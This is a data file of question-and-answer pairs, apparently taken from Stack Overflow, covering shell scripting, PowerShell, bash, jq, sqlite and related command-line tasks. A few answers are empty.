    "PowerShell asynchronous timer events not working outside of testing console": "When calling the script file, the $action script block is executed using the scope of the caller (parent scope), not the script file's scope (child scope). Therefore, variables defined within the script file are not available within the $action script block, unless they are defined to use the global scope or dot-sourced (which will make them available in the global scope). See this wonderful article for more information.\nAssume the below code is contained within a file named test.ps1.\n$timer = New-Object System.Timers.Timer\n$timer.Interval = 10000  \n$timer.AutoReset = $false\n\n$timeout = 100\n$location = 'SomeLocation'\n$sourceIdentifier = 'SomeIdentifier'\n\n$action = { \nWrite-Host \"Timer Event Elapsed. Timeout: $timeout, Location: $location, SourceIdentifier: $sourceIdentifier\"\n$timer.stop()\nUnregister-Event $sourceIdentifier\n}  \n\n$start = Register-ObjectEvent -InputObject $timer -SourceIdentifier $sourceIdentifier -EventName Elapsed -Action $action\n\n$timer.start()\n\nwhile(1)\n{\n Write-Host \"Looping...\"\n Start-Sleep -s 5\n}\nWhen calling from the powershell console, when the $action script block is executed, the variables it uses will have no values.\n./test.ps1\n\nTimer Event Elapsed. Timeout: , Location: , SourceIdentifier:\nIf you define the variables used in the $action script block before you call the script, the values will be available when the action executes:\n$timeout = 5; $location = \"SomeLocation\"; $sourceIdentifier = \"SomeSI\"\n./test.ps1\n\nTimer Event Elapsed. Timeout: 5, Location: SomeLocation, SourceIdentifier: SomeSI\nIf you dot-source the script, the variables defined within the script will become available in the current scope, so when the action executes, the values will be available:\n. ./test.ps1\n\nTimer Event Elapsed. Timeout: 100, Location: SomeLocation, SourceIdentifier: SomeIdentifier\nIf the variables would have been declared in the global scope in the script file:\n$global:timeout = 100\n$global:location = 'SomeLocation'\n$global:sourceIdentifier = 'SomeIdentifier'\nThen when the $action script block executes in the parent scope, the values will be available:\n./test.ps1\n\nTimer Event Elapsed. Timeout: 100, Location: SomeLocation, SourceIdentifier: SomeIdentifier",
    "Installing GCC 4.7.1 on OS X": "Install MacPorts and run:\n$ sudo port selfupdate\n$ sudo port install gcc47\nIt will take care of correctly configuring and installing gcc (4.7.2 at the time of writing) and all dependencies.",
    "Trouble understanding a simple shell script": "This script takes one argument, the name of a source file. It compiles that source file with gcc and if that compilation succeeds it executes the result. (By default, gcc writes the executable as a file named a.out.)\nIf the compilation fails, you're in luck, because the script saves the output (both standard output and standard error) into a file called cmp_out. And if the executed result produces any output, it saves that in run_out. The script itself writes nothing to stderr or stdout. Even if gcc isn't found, that error will end up in cmp_out.\nThe strangest thing about the script is that it inverts the exit status of the execution, using the exclamation point after the if. If executing a.out fails, the script exits with 0, success. If a.out succeeds, the script exits with 1, failure, which is also what it does if the compilation fails. Maybe the exclamation point is an error? The semicolon after the integers are unnecessary.",
    "Bash command to move only some files?": "Turning on extended glob support will allow you to write a regular-expression-like pattern. This can handle files with multi-digit integers, such as '87.jpg' and '87original.jpg'. Bash parameter expansion can then be used to strip \"original\" from the name of a found file to allow you to move the two related files together.\nshopt -s extglob\nfor f in +([[:digit:]])original.jpg; do\n    mv $f ${f/original/} otherDirectory\ndone\nIn an extended pattern, +( x ) matches one or more of the things inside the parentheses, analogous to the regular expression x+. Here, x is any digit. Therefore, we match all files in the current directory whose name consists of 1 or more digits followed by \"original.jpg\".\n${f/original/} is an example of bash's pattern substitution. It removes the first occurrence of the string \"original\" from the value of f. So if f is the string \"1original.jpg\", then ${f/original/} is the string \"1.jpg\".",
    "Put find word count result into a variable": "#!/bin/bash\ncount=$(find *.txt | wc -l)",
    "node.js - sending key-shortcuts to child process": "With a normal ssh session, sending '~' after a newline is the escape character to control the ssh program itself. For example '~.' will close the connection.\nSearch for 'tilde' on the manpage.\nUpdate:\nOn re-reading your question, I think you are probably wanting to send Ctrl-* to the remote process running in the ssh session rather than talking to the ssh process itself. You might just be able to send the ASCII sequence that the Ctrl key would generate:\nsshprocess.stdin.write(\"\\x03\")\nASCII character 0x03 is what Ctrl-C becomes. This is from the ancient days of dumb terminals. More about ASCII control sequences.",
    "How to use `set -e` inside a bash command substitution?": "Q: How would you go about implementing this without set -e (i.e. print the output of a function only if something went wrong while executing it)?\nYou may use this way by checking return value of the function:\n#!/usr/bin/env bash\n\nfoo() {\n  local n=$RANDOM\n  echo \"Foo working with random=$n ...\"\n  (($n % 2))\n}\n\necho \"Doing something that could fail...\"\na=\"$(foo 2>&1)\"\ncode=$?\nif (($code == 0)); then\n  echo \"Success!\"\nelse\n  printf '{\"ErrorCode\": %d, \"ErrorMessage\": \"%s\"}\\n' $code \"$a\"\n  exit $code\nfi\nNow run it as:\n$> ./errScript.sh\nDoing something that could fail...\nSuccess!\n$> ./errScript.sh\nDoing something that could fail...\n{\"ErrorCode\": 1, \"ErrorMessage\": \"Foo working with random=27662 ...\"}\n$> ./errScript.sh\nDoing something that could fail...\nSuccess!\n$> ./errScript.sh\nDoing something that could fail...\n{\"ErrorCode\": 1, \"ErrorMessage\": \"Foo working with random=31864 ...\"}\nThis dummy function code returns failure if $RANDOM is even number and success for $RANDOM being odd number.\nOriginal answer for original question\nYou need to enable set -e in command substitution as well:\n#!/usr/bin/env bash\nset -eu\nset -o pipefail\n\nfoo() {\n  printf \"Foo working... \"\n  echo \"Failed!\"\n  false  # point of interest #1\n  true   # point of interest #2\n}\n\nprintf \"Doing something that could fail... \"\na=\"$(set -e; foo)\"\ncode=$?\nif (($code == 0)); then\n  echo \"Success!\"\nelse\n  echo \"Error:\"\n  printf \"${a}\"\n  exit $code\nfi\nThen use it as:\n./errScript.sh; echo $?\nDoing something that could fail... 1\nHowever do note that using set -e is not ideal in shell scripts and it may fail to exit script in many scenarios.\nDo check this important post on set -e",
    "dash '-' after #!/bin/sh -": "The documentation you are reading has nothing to do with the command line you're looking at: it's referring to special variables. In this case, if you run echo $- you will see \"the current option flags as specified upon invocation...\".\nIf you take a look at the OPTIONS part of the bash man page, you will find:\n--       A -- signals the end of options and disables  further  option  processing.\n         Any  arguments  after  the  -- are treated as filenames and arguments.  An\n         argument of - is equivalent to --.\nIn other words, an argument of - simply means \"there are no other options after this argument\".\nYou often see this used in situation in which you want to avoid filenames starting with - accidentally being treated as command options: for example, if there is a file named -R in your current directory, running ls * will in fact behave as ls -R and produce a recursive listing, while ls -- * will not treat the -R file specially.\nThe single dash when used in the #! line is meant as a security precaution. You can read more about that here.",
    "psql: warning: extra command-line argument \"from\" ignored": "This is a pretty cheap and common error. Putting everything in quotes should do the trick.\nTry this:\nPGPASSWORD=\"$PGPASS\" psql -h '127.0.0.1' -U 'postgresql' -d \"$PGDB\" --command \"select count(*) from services\"\nLet us know if it works for you.",
    "Conditionals in POSIX standards": "Bash-specific\n[[ .. ]]\nPOSIX = sh, like Dash\n[ .. ]\nAs you also asked for personal opinion, mine is: If there is no reason to use the Bash-specific way, always try to adhere to POSIX standards.\nTwo examples\nComparing strings\nin Bash\n[[ \"$a\" == \"$b\" ]]\nin a POSIX shell\n[ \"$a\" = \"$b\" ]\nWhile loop condition\nin Bash\nwhile [[ \"$i\" > 0 ]]\nin a POSIX shell\nwhile [ \"$i\" -gt 0 ]\nConclusion\nWhile it may seem POSIX is rather harder to use, and it certainly may be at times, it gives you the power to move the script to any shell environment, i.e. portability. For example, you can run the same script on Windows in Cygwin and in any Linux shell.\nI realize now, you specifically asked about the if conditional statements, and what I said is perfectly applicable to that question too.",
    "Passing all parameters to a function in fish shell": "In fish all variables are lists, and $var expands to the entire list, one argument per element (so there's no word splitting or anything).\nSo just $argv is enough, there is no need to specify [1..-1].",
    "Using jq to update objects within a JSON document if the value corresponding to a given key starts with a specified string": "You can also use map, like this:\njq '(.values)|=(map((if .name|startswith(\"test\") then .id=\"NEWID\"  else . end)))' file\nOutput:\n{\n  \"other-value\": \"some-id\",\n  \"values\": [\n    {\n      \"name\": \"test-2017-12-01\",\n      \"id\": \"NEWID\"\n    },\n    {\n      \"name\": \"othert\",\n      \"id\": \"2\"\n    }\n  ]\n}",
    "Why would gnu parallel chunking improve gzip's compression size?": "The reason is that for this particular, rather unusual input, smaller deflate blocks are better than larger ones. By default gzip uses larger deflate blocks, since that works best for normal input data. The parallel command is forcing a few smaller deflate blocks by breaking up the input every 1 MB, resulting in a small gain. Though most of the blocks are still the same size.\nYou can do much better by setting a smaller block size for every block by using zlib's memLevel parameter in deflateInit2(). Here I compress the same output in a single thread each time, using memLevel values from 9 to 2, where a smaller memLevel is a smaller deflate block size (note that zlib does a little better than your gzip at the default level):\n9 - 199688429\n8 - 198554111 (default)\n7 - 191582070\n6 - 184880482\n5 - 181295029\n4 - 180137425 (optimum for this input)\n3 - 181176610\n2 - 185759115\nThe optimum memLevel for this data turns out to be 4, for which the compressed data is 12 MB (9%) smaller than for the default memLevel of 8. For memLevel 8, the deflate block size is 16383 symbols, whereas for memLevel 4, the deflate block size is 1023 symbols. One symbol is either a literal byte or a match.\nThe improvement comes from the extremely regular nature of the input, resulting in a regular sequence of match and literal commands. The smaller the block size, the fewer such distinct commands that appear, which then takes fewer bits to code each of them. This is still true for memLevel 3, but by then the overhead of the code description at the beginning of each deflate block cancels the improvement from fewer distinct codes.\nzopfli is a deflate compressor that optimizes the block size and the commands selected, and managed to compress it to 100,656,812 bytes. It took three and a half hours though! zopfli is invoked with pigz using compression level 11.",
    "ln -s and overwriting a physical directory": "The ln utility may be asked to remove the destination if it already exists by adding the -f option. However, the POSIX standard says that this is done with a call to the C library routine unlink(), and about that function, the standard says\nThe path argument shall not name a directory unless the process has appropriate privileges and the implementation supports using unlink() on directories.\nI have not access to a system where unlink() is documented to remove directories, or where the -f flag to ln is documented to remove directories.\nYour solution is therefore to either\n$ rm -rf /path/to/A\nor, which would be safer,\n$ mv -f /path/to/A /path/to/A.orig\nbefore creating the symbolic link.",
    "linux command to find files and replace with another file": "Assuming you have the replacement file in your home directory (~), you can use find to do the replacing. This will find all boom.txt files and replace them with the replace.txt file (keeping the boom.txt name).\nfind . -name \"boom.txt\" -exec cp ~/replace.txt {} \\;",
    "How to analyse sh files in Sonar? [closed]": "Assuming your .sh files are bash scripts or some approximate equivalent then you can't currently configure your SonarQube server to analyze them because there's no plugin that handles such scripting.\nSept 2018 Update\nThere's now a plugin in the Marketplace to read in i-Code CNES reports. i-Code CNES covers two flavors of Fortran and Shell.",
    "Portable way to build up arguments for a utility in shell?": "If you need to use mostly-POSIX sh, such as would be available in busybox ash-named-bash, you can build up positional parameters directly with set\n$ set -- hello\n$ set -- \"$@\" world\n$ printf '%s\\n' \"$@\"\nhello\nworld\nFor a more apt example:\n$ set -- /etc -name '*b*'\n$ set -- \"$@\" -type l -exec readlink {} +\n$ find \"$@\"\n/proc/mounts",
    "Correct and secure way to have PHP execute a shell script": "",
    "Source environment variables and execute bash before running local script on remote machine [duplicate]": "eval can accomplish this for you:\neval $(cat /path/to/environment) ./script.sh\nYou can source multiple files this way too if you want if you know there path:\neval $(cat /path/to/environment1 /path/to/environment2) ./script.sh\nOr iterate over a directory:\neval $(cat $(find -type f /path/to/environments)) ./script.sh\nStick SSH in front of it if you're doing this remotely to solve your specific problem:\n# note the quotes otherwise we'll source our local environment\nssh user@host \"'eval $(cat /path/to/environment)' ./remote_script.sh\"\n\n# If it's a local environment you want to sort, then do the same\n# command without the quotes:\nssh user@host \"eval $(cat /path/to/environment)\" ./remote_script.sh\nIf you want to source a remote environment into your own then use eval locally as so:\neval \"$(ssh user@host cat /path/to/environment)\" ./local_script.sh\nThis alls you to source an external file setting it's environment variables in the same forked instance that will calls your script (making them available).\nConsider a script file that looks like this:\n#!/bin/sh\necho \"$VAR1\"\necho \"$VAR2\"\ntest_function\nNow consider your environment file looks like this:\n# Environment Variables\nVAR1=foo\nVAR2=bar\ntest_function()\n{\n   echo \"hello world\"\n}\nYou'd see the output if you use the eval example:\nfoo\nbar\nhello world\nAlternatively, if you just open up your script you wrote, you can source these environment variables directly from within it and then you can just call the script normally without any tricks:\n#!/bin/sh\n\n# Source our environment by starting with period an then following\n# through with the full path to the environment file. You can also use\n# the 'source' keyword here too instead of the period (.).\n. /path/to/environment\n\necho \"$VAR1\"\necho \"$VAR2\"\ntest_function",
    "flock(1) is failing to release lock": "The problem is that you're running TrueCrypt in the background, keeping the fd open. You should close the fd to prevent background processes from hanging on to the lock.\nIn lieu of your actual code, here's a test case:\nfoo() {\n  ( \n    flock -n 9 && echo \"ok\" || { echo failed; exit 1; }\n    sleep 10 &\n  ) 9> lock\n}\nfoo; foo\n\n# Output:\n# ok\n# failed\nsleep is forked with fd 9 open, causing the lock to be kept. Let's close fd 9 when backgrounding the process:\nfoo() {\n  ( \n    flock -n 9 && echo \"ok\" || { echo failed; exit 1; }\n    sleep 10 9>&- & \n  #          ^-------- Right here\n  ) 9> lock\n}\nfoo; foo\n\n# Output:\n# ok\n# ok",
    "Best Way to Get File Modified Time in Seconds": "Since it seems like there might not be a \"correct\" solution I figured I'd post my current one for comparison:\nif stat -c %Y . >/dev/null 2>&1; then\n    get_modified_time() { stat -c %Y \"$1\" 2>/dev/null; }\nelif stat -f %m . >/dev/null 2>&1; then\n    get_modified_time() { stat -f %m \"$1\" 2>/dev/null; }\nelif date -r . +%s >/dev/null 2>&1; then\n    get_modified_time() { date -r \"$1\" +%s 2>/dev/null; }\nelse\n    echo 'get_modified_time() is unsupported' >&2\n    get_modified_time() { printf '%s' 0; }\nfi\n[edit] I'm updating this to reflect the more up to date version of the code I use, basically it tests the two main stat methods and a somewhat common date method in any attempt to get the modified time for the current working directory, and if one of the methods succeeds it creates a function encapsulating it for use later in the script.\nThis method differs from the previous one I posted since it always does some processing, even if get_modified_time is never called, but it's more efficiently overall if you do need to call it most of the time. It also lets you catch an unsupported platform earlier on.\nIf you prefer the function that only tests functions when it is called, then here's the other form:\nget_modified_time() {\n    modified_time=$(stat -c %Y \"$1\" 2> /dev/null)\n    if [ \"$?\" -ne 0 ]; then\n        modified_time=$(stat -f %m \"$1\" 2> /dev/null)\n        if [ \"$?\" -ne 0 ]; then\n            modified_time=$(date -r \"$1\" +%s 2> /dev/null)\n            [ \"$?\" -ne 0 ] && modified_time=0\n        fi\n    fi\n    echo \"$modified_time\"\n}",
    "How to test whether a command output is non-empty in POSIX shell?": "You can check the exit status of the command also. Usually, commands if successfuly run, return an exit status of 0.\ngit ls-files --killed > /dev/null\nif [ $? -eq 0 ]\nOR if you want to only depend on the output of the command , you can use the \"head -1\" along with you 1st option since anyway it looks you are not doing any processing with your command output apart from knowing the result.",
    "TAB autocomplete python CLI": "That is a feature of the shell, not of the Python script being called. See this question on SO for more info on shell completion. In particular, you're looking for programmable completion.",
    "How to use bash/expect to check if an SSH login works": "I've been using something like the script below for a similar task.\n#!/bin/sh\n# Run using expect from path \\\nexec expect -f \"$0\" \"$@\"\n# Above line is only executed by sh\nset i 0; foreach n $argv {set [incr i] $n}\nset pid [ spawn -noecho ssh $1@$3 $4 ]\nset timeout 30\nexpect {\n    \"(yes/no)\" {\n        sleep 1\n        send \"yes\\n\"\n        exp_continue\n    }\n    \"(y/n)\" {\n        sleep 1\n        send \"y\\n\"\n        exp_continue\n    }\n    password {\n        sleep 1\n        send \"$2\\n\"\n        exp_continue\n    }\n    Password {\n        sleep 1\n        send \"$2\\n\"\n        exp_continue\n    }\n    \"Last login\" {\n        interact\n    }\n    \"Permission denied\" {\n        puts \"Access not granted, aborting...\"\n        exit 1\n    }\n    timeout {\n        puts \"Timeout expired, aborting...\"\n        exit 1\n    }\n    eof {\n        #puts \"EOF reached.\"\n    }\n}\nset status [split [wait $pid]]\nset osStatus [lindex $status 2]\nset procStatus [lindex $status 3]\nif { $osStatus == 0 } {\n    exit $procStatus\n} else {\n    exit $procStatus\n}",
    "How to programmatically determine default applications in linux": "I accessed the list while ago programatically in a rather ugly manner and I'm sure its not the best way. The options are stored in a file called defaults.list (I think this is generally the case). The location is less general I think it in /usr/share/applications/ on my ubuntu system although it does appear elsewhere I think. I then treated it as a text file.",
    "Getting video information from MediaInfo": "You can also use curl | head to partially download the file before running mediainfo.\nHere's an example of getting the dimensions of a 12 MB file from the web, where only a small portion (less than 10 KB) from the start needs to be downloaded:\ncurl --silent http://www.jhepple.com/support/SampleMovies/MPEG-2.mpg \\\n  | head --bytes 10K > temp.mpg\nmediainfo '--Inform=Video;%Width%x%Height%' temp.mpg",
    "What is the difference between the various shell profiles?": "The man page for bash says there are the following initialization files for bash shells:\n/etc/profile\n      The systemwide initialization file, executed for login shells\n/etc/bash.bashrc\n      The systemwide per-interactive-shell startup file\n/etc/bash.bash.logout\n      The systemwide login shell cleanup file, executed when a login shell exits\n~/.bash_profile\n      The personal initialization file, executed for login shells\n~/.bashrc\n      The individual per-interactive-shell startup file\n~/.bash_logout\n      The individual login shell cleanup file, executed when a login shell exits\n~/.inputrc\n      Individual readline initialization file\nApparently there seem to be different configuration files for the different shells (bash, zsh, csh, and others). There seem to be as many shells as different linux and unix versions: csh, ksh, bash, zsh, ... Bash has a .bashrc, Zsh has a .zshrc, etc. One can also distinguish between login shells and non-login shells and between system-wide defaults and user-specific defaults.\nIt makes sense to distinguish between login and non-login shells, because some commands should be processed only at login, while other commands should run everytime you open a new terminal window. That is the difference between .bash_profile and .bashrc. For bash the .bashrc is reloaded every time you start a new copy of bash, i.e. when you start a new bash but do not login. The .bash_profile or .profile is loaded only when you login. The abbtreviation rc in bashrc stands for \"run commands\" or \"run control\" and is a convention adopted from older Unix systems.\nsystem-wide defaults for..\n/etc/profile ..login shells, for interactive shells with login\n/etc/bashrc ..non-login Bash shells\nuser-specific defaults in home directory ~ for..\n~/.profile ..login shells, called after login\n~/.bashrc ..non-login shells, if already logged in\n~/.bash_profile ..login shells, called after login (lower priority)\nuser-specific defaults in home directory for login and logout\n~/.bash_login ..login shells (called upon login)\n~/.bash_logout ..login shells (called upon logout)\nThe following links were helpful: .bashrc vs .bashprofile and .bash_profile vs .bashrc, the bash manual page (man bash), and Zsh/Bash startup files loading order (.bashrc, .zshrc etc.).",
    "How to show ping output dynamically in a web page?": "If I understand you correctly, what you want is generally receiving some information from web server in client while client doesn't know when exactly that information is incoming, i.e. pushing information from web server to client. There are a few ways to do that, all of them have some downsides:\nHTTP push - requires a keep-alive connection and server keeping sending information in chunked manner, announcing next chunk incoming every time and not sending it until ready. Usually this \"chucked stream\" is either received in XMLHttpRequest object or a hidden iframe, although it's possible to just display it to user as is if it's desirable (as in your case).\nPolling - client just asks server if it's something incoming regularly. Daunting, has huge messaging latencies and it's a traffic hog, but works almost always.\nLong polling - a combination of polling and HTTP push - i.e. first answer after poll gets delayed till it will be something to answer.\nServer-sent events (SSE) - a nearly-accepted standard, implemented in Opera for ages, now many browsers support it and it's aiming to become a W3C standard.\nWebSockets is also a newly proposed standard by Google, allowing more complex TCP connections with send/receive functionality from Javascript. It also can be used for HTTP push.\nUsing non-HTML methods (i.e. Flash, Java, Silverlight) to get incoming content. There are a few libraries / readymade modular SWFs/applets (for example, BlazeDS) available for this purpose, which can tunnel information from a given connection to execute as JSON on target page, for example.\nAll these methods are indeed covered by umbrella terms \"HTTP push\" and \"comet\". There's plenty of documentation, tutorials and existing solutions flying around. For example, for RoR, you can try Juggernaut or shooting_star, or just opt for minimalistic solutions.\nFinally, I'd like to recommend an excellent article by Gregor Roth on SSE (part 1) and WebSockets (part 2) that gives detailed explanations, examples and prospects for usage.",
    "ZSH: execute function in a script file": "zsh doesn't perform word-splitting on parameter expansions by default, so git and pull aren't two separate words in the desired command. While you can enable it on a particular parameter expansion, a better approach is to just use an array.\ngp () {\n  local cmd=(git pull)\n  echo \"=> ${cmd[*]}\"\n  \"${cmd[@]}\"\n}",
    "Script output is buffered into one message, despite separate echo statements?": "You can use the readline interface provided as part of the node APIs. More information here https://nodejs.org/api/readline.html#readline_event_line. You will use spawn as it is however pass the stdout to readline so that it can parse the lines. Not sure if this is what you intend to do. Here is some sample code:\nvar process = require('child_process');\nconst readline = require('readline');\n\nvar child = process.spawn('./test.sh');\n\n// Use readline interface\nconst readlinebyline = readline.createInterface({ input: child.stdout });\n\n// Called when a line is received\nreadlinebyline.on('line', (line) => {\n    line = JSON.stringify(line.toString('utf8'));\n    console.log(line);\n});\nOutput:\n\"first message\"\n\"second message\"\n\"third message\"\nIf you get an error like TypeError: input.on is not a function, make sure you have executing privileges on the test.sh script via chmod +x test.sh.",
    "Which shell does Perl 6's shell() use?": "Looking at the source, rakudo just calls /bin/sh -c on non-windows and uses %*ENV<ComSpec> /c on windows.",
    "Omitting columns when importing CSV into Sqlite": "Create a temporary table with the age column, and then use an INSERT... SELECT to move the data from the temporary table into your main one:\nCREATE TEMP TABLE _csv_import (name text, age integer, gender text);\n.separator \",\"\n.import file.csv test\n\nINSERT INTO names_genders (name, gender) SELECT name, gender\n    FROM _csv_import WHERE 1;\nDROP TABLE _csv_import;\nEDIT: Updating into a view with a phantom age column:\nCREATE VIEW names_ages_genders AS \n    SELECT (name, 0 AS age ,gender) FROM names_genders;\nCREATE TRIGGER lose_age\n    INSTEAD OF INSERT ON names_ages_genders\n    BEGIN\n        INSERT INTO names_genders (name, gender) \n            VALUES (NEW.name, NEW.gender)\n    END;\nThis will create a view called names_ages_genders that will say everybody is zero years old, and will silently drop the age field from any INSERT statement called on it. Not tested! (I'm actually not sure .import can import into views.)",
    "Ruby Command Line Implicit Conditional Check": "The Ruby parser has a special case for regular expression literals in conditionals. Normally (i.e. without using the e, n or p command line options) this code:\nif /foo/\n  puts \"TRUE!\"\nend\nproduces:\n$ ruby regex-in-conditional1.rb\nregex-in-conditional1.rb:1: warning: regex literal in condition\nAssigning something that matches the regex to $_ first, like this:\n$_ = 'foo'\nif /foo/\n  puts \"TRUE!\"\nend\nproduces:\n$ ruby regex-in-conditional2.rb\nregex-in-conditional2.rb:2: warning: regex literal in condition\nTRUE!\nThis is a (poorly documented) exception to the normal rules for Ruby conditionals, where anything that\u2019s not false or nil evaluates as truthy.\nThis only applies to regex literals, the following behaves as you might expect for a conditional:\nregex = /foo/\nif regex\n  puts \"TRUE!\"\nend\noutput:\n$ ruby regex-in-conditional3.rb\nTRUE!\nThis is handled in the parser. Searching the MRI code for the text of the warning produces a single match in parse.y:\ncase NODE_DREGX:\ncase NODE_DREGX_ONCE:\n warning_unless_e_option(parser, node, \"regex literal in condition\");\n return NEW_MATCH2(node, NEW_GVAR(rb_intern(\"$_\")));\nI don\u2019t know Bison, so I can\u2019t explain exactly what is going on here, but there are some clues you can deduce. The warning_unless_e_option function simply suppresses the warning if the -e option has been set, as this feature is discouraged in normal code but can be useful in expressions from the command line (this explains why you don\u2019t see the warning in your code). The next line seems to be constructing a parse subtree which is a regular expression match between the regex and the $_ global variable, which contains \u201c[t]he last input line of string by gets or readline\u201d. These nodes will then be compiled into the usually regular expression method call.\nThat shows what is happening, I\u2019ll just finish with a quote from the Kernel#gets documentation which may explain why this is such an obscure feature\nThe style of programming using $_ as an implicit parameter is gradually losing favor in the Ruby community.",
    "Execute Shell script/command from MySQL Trigger/Stored Procedure": "You can read this blog for triggering a shell script from MySQL: https://patternbuffer.wordpress.com/2012/09/14/triggering-shell-script-from-mysql/. To summarize, two options are presented:\nPolling. To improve performance, a trigger could record the change in another table which you poll instead.\nMySQL UDF. Write your own plugin, and beware of security implications!\nI think for your requirement just write a python/php/perl script which will connect your MySQL DB and query the alert table for any alert and accordingly show warning message on the screen or send email/sms warning.",
    "Symbolic link source item can't be found": "Use the absolute source path while creating the link. That worked for me having the same issue.",
    "How to keep program running in background in ash shell": "An alternative to:\nnohup command &\nUsing clever parentheses:\n(( command & ) & )\nAnd also if you want to drop stdin/stdout:\n(( command 0<&- &>/dev/null &) &)\nExplanation\nTLDR: We made a subshell start a subshell to execute a command, thus starting an orphan process. Orphans only die when the init process dies.\nThe difference between putting subshell in background vs putting command in background is that subshells have different process states\nWhen you log out of an SSH session or close any sh shell session a SIGHUP signal is sent to all of the child processes of that shell. What we did here is we started a subshell to start a subshell, thus disowning the started process. We now have an orphan process.\nThis orphaned process no longer has a PPID (parent process ID) that identifies with our SSH session. So when we logout of the SSH session and a SIGHUP is sent to all of our child processes, it never hits the orphan.",
    "how to escape the pipe character in grep?": "Use grep -F - the variables will be interpreted by the shell and replaced with their respective values, then the quoted string (including the pipes) will be interpreted as a fixed string. Example:\n$ cat file.txt\ncoupait ||| eastern ||| 0.045454545454545456 2.718 ||| 0-0 ||| \ninstaurer ||| characteristic ||| 5.797101449275362E-4 2.718 ||| 0-0 |||\ntiendrait ||| fails ||| 0.005 2.718 ||| 0-0 |||\n$ word1=coupait\n$ word2=eastern\n$ grep -F \"$word1 ||| $word2 |||\" file.txt\ncoupait ||| eastern ||| 0.045454545454545456 2.718 ||| 0-0 ||| ",
    "how to run cygwin script in powershell": "Use either /cygdrive/c/script/path/script or C:/script/path/script (note the capital C and lack of leading slash in the latter path). Plus, need to run the script with the correct interpreter, e.g.:\n& C:\\cygwin\\bin\\bash.exe /cygdrive/c/script/path/script ...",
    "Use result from mongodb in shell script": "The superfluous output is the result of your assignment of a='b', which displays the result of the assignment in this context.\nIf you add the var keyword for variable assignment, you shouldn't have any extra output (and can still use the variable a in your script):\n$ mongo --quiet --eval \"var a='b'\" mongoscript.js\nfoo\nYou can see the same behaviour in the mongo shell:\n> a='b'\nb\n> var a='b'\n>",
    "creating multiple copies of a file in bash with a script": "The brace expansion mechanism is a bit limited; it doesn't work with variables, only literals.\nFor what you want, you probably have the seq command, and could write:\nINPUT=testFile\nfor num in $(seq 1 15)\ndo\n    cp \"$INPUT\" \"$INPUT$num\"\ndone",
    "How to create a bash script with optional parameters for a flag": "The getopt external program allows options to have a single optional argument by adding a double-colon to the option name.\n# Based on a longer example in getopt-parse.bash, included with\n# getopt\nTEMP=$(getopt -o a:: -- \"$@\")\neval set -- \"$TEMP\"\nwhile true ; do\n   case \"$1\" in\n     -a)\n        case \"$2\" in \n          \"\") echo \"Option a, no argument\"; shift 2 ;;\n          *) echo \"Option a, argument $2\"; shift 2;;\n        esac ;;\n     --) shift; break ;;\n     *) echo \"Internal error!\"; exit 1 ;;\n   esac\ndone",
    "Is there a way to detect changes in a folder using php on both windows and linux?": "",
    "Shell piping with subprocess in Python": "You can do:\npipe = Popen(command_2, shell=True, stdin=PIPE, stdout=PIPE)\npipe.stdin.write(result_1)\npipe.communicate()\ninstead of the line with the pipe.",
    "What does a lambda prompt indicate at the command line? [closed]": "I don't think it serves a particular use other than looking cool. \ud83d\ude04",
    "how to add folder to subfolder inside existing zip file": "To append \"archive\" to an existing zip file you could use option -r:\nzip -r9 dummy.zip dirs\nYou could crate your zip:\n$ zip -9 dummy.zip file\nAnd later you could add a full dir:\n$ zip -r9 dummy.zip dirs \nOr contents of the dir on the same root:\n$ cd dirs\n$ zip -r9 dummy.zip *\nThe -9 is the compression level, in this case, the maximum.",
    "How to set a prefix to bash verbose mode": "You can use PS4 with set -x (enable trace):\n#!/bin/bash\n\n# prompt for trace commands\nPS4='$ '\n\n# enable trace\nset -x\n\n# remaining script\npwd\nhostname\nThis will produce output as:\n$ pwd\n/home/username\n$ hostname\nmyawesomehost",
    "How to get system image list icon index of an IShellItem?": "Basically it doesn't seem that there's any easy method for this. It simply hasn't been provided in the API.\nIn your question you say \"But the shell supports things besides files and folders in the filesystem.\", which makes me think you have overlooked that SHGetFileInfo does actually support using PIDLs directly (with the SHGFI_PIDL flag) - so it can be used on non-filesystem objects. If you still have the full PIDL this is the easiest way to get an icon index, otherwise something like this should hopefully work:\nint GetIShellItemSysIconIndex(IShellItem* psi)\n{\n    PIDLIST_ABSOLUTE pidl;\n    int iIndex = -1;\n\n    if (SUCCEEDED(SHGetIDListFromObject(psi, &pidl)))\n    {\n        SHFILEINFO sfi{};\n        if (SHGetFileInfo(reinterpret_cast<LPCTSTR>(pidl), 0, &sfi, sizeof(sfi), SHGFI_PIDL | SHGFI_SYSICONINDEX))\n            iIndex = sfi.iIcon;\n        CoTaskMemFree(pidl);\n    }\n    return iIndex;\n}\nOr using Raymond Chen's suggestion:\nint GetIconIndex(IShellItem item)\n{\n    Int32 imageIndex;\n\n    PIDLIST_ABSOLUTE parent;\n    IShellFolder folder;\n    PITEMID_CHILD child;\n\n    //Use IParentAndItem to have the ShellItem \n    //cough up the IShellObject and child pidl it is wrapping.\n    (item as IParentAndItem).GetParentAndItem(out parent, out folder, out child);\n    try\n    {        \n       //Now use IShellIcon to get the icon index from the folder and child\n       (folder as IShellIcon).GetIconOf(child, GIL_FORSHELL, out imageIndex);\n    }\n    finally\n    {\n       CoTaskMemFree(parent);\n       CoTaskMemFree(child);\n    }\n\n    return imageIndex;\n}\nTurns out that IShellFolder doesn't support the IShellIcon sometimes. For example attempting to browse inside a zip file. When that happens, the QueryInterface of IShellFolder for IShellIcon fails.\nshellFolder.QueryInterface(IID_IShellIcon, out shellIcon); //<--fails with E_NOINTERFACE\nYet SHGetFileInfo knows how to handle it.\nSo best to not try to get an IShellIcon interface yourself. Leave the heavy lifting to SHGetFileInfo (at least until someone from Microsoft documents how to use IShellIcon).",
    "Best practices on setting exit status codes": "Providing a descriptive error message to stderr is fine and well for interactive users, but if you expect your scripts to be used by other scripts/programs, you should have distinctive error codes for different failures, so the calling script could make an informed decision on how to handle the failure.\nIf the calling program does not wish to handle different failures differently it could always check the return code against > 0 - but don't assume this is the case.",
    "Measure code coverage of an executed shell script with kcov/shunit2": "Please submit a bug report to the kcov issue tracker,\nhttps://github.com/SimonKagstrom/kcov\nit should support this as far as I can tell. (I'm the author of Kcov).",
